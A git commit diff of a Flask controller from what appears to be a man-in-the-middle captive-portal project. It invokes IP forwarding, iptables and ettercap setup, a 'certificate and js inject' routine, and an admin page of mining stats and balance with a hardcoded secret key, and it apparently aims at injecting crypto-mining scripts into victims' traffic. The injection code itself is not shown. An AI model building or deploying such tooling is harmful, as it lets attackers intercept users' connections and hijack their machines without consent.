da90a051122be47634df4cedec4becee7af518e9
Aileen Sun <aileen.sun@gmail.com>
2018-10-18 19:38:31 -0400

    Update general.py

--- run/src/controllers/general.py
+++ run/src/controllers/general.py
@@ -7,30 +7,31 @@ import models
 
 app = Flask(__name__)
 
-@app.route('/Welcome', methods = ['GET','POST'])
+#def startup():
+#    models.ip_forward()
+#    models.config_iptables()
+#    models.config_ettercap()
+
+@app.route('/welcome', methods = ['GET','POST'])
 def welcome():
     if request.method == 'GET':
-        models.ip_forward()
-        models.config_ettercap()
-        models.config_iptables()
-        if True:
-            return render_template('index.html')
+        return render_template('index.html')
     else:
         if request.form['submit'] == 'agree':
-            models.injector() #certificate and js inject
-            #TODO locate current IP address, append to txt file, and pass onto mining py file
-                if True:
+            models.injector()
+            if True:
                 return redirect ('http://www.google.com', code = 302)
         else:
             return redirect ('/Welcome')
 
-@app.route('/Admin', methods = ['GET','POST'])
+@app.route('/admin', methods = ['GET','POST'])
 def admin():
     if request.method == 'GET':
         secret_key = 'v39MYkdyRkYqkuqbqfRGC6JbNct3Eka0'
         stats = models.get_stats(secret_key)
         balance = models.get_balance(secret_key)
         return render_template('admin.html', stats=stats, balance=balance)
+
     else:
         return render_template('admin.html')
 
